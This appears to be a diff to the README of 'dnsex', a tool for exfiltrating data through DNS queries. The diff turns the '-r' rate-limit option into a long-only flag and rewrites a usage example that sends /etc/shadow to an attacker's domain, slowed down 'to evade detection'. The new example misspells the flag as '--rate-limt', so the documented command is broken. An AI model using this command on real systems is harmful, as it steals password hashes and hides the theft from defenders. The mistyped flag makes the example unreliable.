@@ -36,7 +36,7 @@ dnsex client [OPTIONS] --domain <DOMAIN> [MESSAGE]
   -d, --domain <DOMAIN>        The target domain of your DnsEx server
   -p, --port <PORT>            The DNS port to target [default: 8053]
   -f, --file <FILE>            Path to a file to exfiltrate
-  -r, --rate-limit <LIMIT>     Delay between queries in ms [default: 100]
+      --rate-limit <LIMIT>     Delay between queries in ms [default: 100]
   -h, --help                   Print help
 ```
 
@@ -58,5 +58,5 @@ dnsex client -d yourdomain.com "Hello from the inside"
 **Exfiltrate a file:**
 Send a sensitive file with a 50ms delay between packets to evade detection.
 ```bash
-dnsex client -d yourdomain.com -f /etc/shadow -r 50
+dnsex client -d yourdomain.com -f /etc/shadow --rate-limt 50
 ```
